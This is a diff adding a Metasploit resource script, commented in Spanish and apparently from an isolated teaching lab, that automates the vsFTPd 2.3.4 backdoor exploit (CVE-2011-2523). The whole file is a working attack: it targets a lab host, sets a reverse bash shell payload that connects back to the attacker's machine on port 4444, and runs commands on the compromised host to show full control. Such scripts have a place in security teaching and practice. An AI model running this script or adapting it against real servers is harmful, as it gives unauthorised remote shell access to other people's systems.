@@ -1,0 +1,29 @@
+# ============================================================================
+#  explota_vsftpd.rc  -  Morini Computers / Ciberseguridad (lab AISLADO)
+#  Automatiza la explotacion del backdoor de vsFTPd 2.3.4 (CVE-2011-2523)
+#  contra una maquina VICTIMA PROPIA del laboratorio. Solo fines educativos.
+#
+#  Uso:  msfconsole -q -r explota_vsftpd.rc
+# ============================================================================
+
+# 1) Elegimos el exploit del backdoor de vsFTPd 2.3.4
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# 2) Objetivo: la victima del laboratorio (NUNCA un sistema ajeno)
+set RHOSTS 10.13.37.20
+
+# 3) Payload: shell inverso por bash. LHOST = nuestra Kali (a donde vuelve la shell)
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 10.13.37.10
+set LPORT 4444
+
+# 4) Lanzamos el ataque y dejamos la sesion en segundo plano (-z)
+run -z
+sleep 5
+
+# 5) Confirmamos la sesion y demostramos el control total de la maquina
+sessions -l
+sessions -c "id; hostname; uname -a" -i 1
+
+# 6) Cerramos Metasploit (en una auditoria real dejarias la sesion abierta)
+exit -y
